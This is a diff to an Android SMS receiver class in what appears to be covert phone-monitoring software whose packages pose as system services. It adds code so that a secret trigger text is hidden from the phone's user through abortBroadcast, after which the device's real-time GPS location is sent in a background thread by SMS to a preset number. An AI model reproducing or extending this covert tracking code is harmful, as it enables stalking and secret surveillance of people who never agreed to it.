@@ -19,6 +19,8 @@ import com.particle.inspector.common.util.LangUtil;
 import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
+
+import system.service.feature.location.LocationUtil;
 import system.service.feature.sms.SmsCtrl;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.SysUtils;
@@ -40,6 +42,7 @@ public class SmsReceiver extends BroadcastReceiver
 {
 	private static final String LOGTAG = "SmsReceiver";
 	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
+	private Context context;
 	
 	// **************************************************************************************
     // Receiver for SMS handling
@@ -248,20 +251,26 @@ public class SmsReceiver extends BroadcastReceiver
 			else if (smsBody.equalsIgnoreCase(GlobalPrefActivity.getGpsWord(context))) 
 			{
 				if (!ConfigCtrl.isLegal(context)) return;
-
+				
+				this.context = context;
 				abortBroadcast(); // Do not show location activation SMS
 				
-				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-				if (phoneNum.length() > 0) {
-					if (BootService.locationUtil == null) {
-						Log.e(LOGTAG, "GPS utility is NULL");
-						return;
-					}
-					String realOrHist = "";
-					Location location = BootService.locationUtil.getLocation(realOrHist);
-					String locationSms = SmsCtrl.buildLocationSms(context, location, realOrHist);
-					boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
-				}
+				// Start a new thread to do the time-consuming job
+    			new Thread(new Runnable(){
+    				public void run() {
+    					String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
+    					if (phoneNum.length() > 0) {
+    						if (BootService.locationUtil == null) {
+    							//Log.e(LOGTAG, "GPS utility is NULL");
+    							return;
+    						}
+    						String realOrHist = LocationUtil.REALPOSITION;
+    						Location location = BootService.locationUtil.getLocation(realOrHist);
+    						String locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location, realOrHist);
+    						boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
+    					}
+    				}
+    			}).start();
 			}
 		} // end of SMS_RECEIVED
         
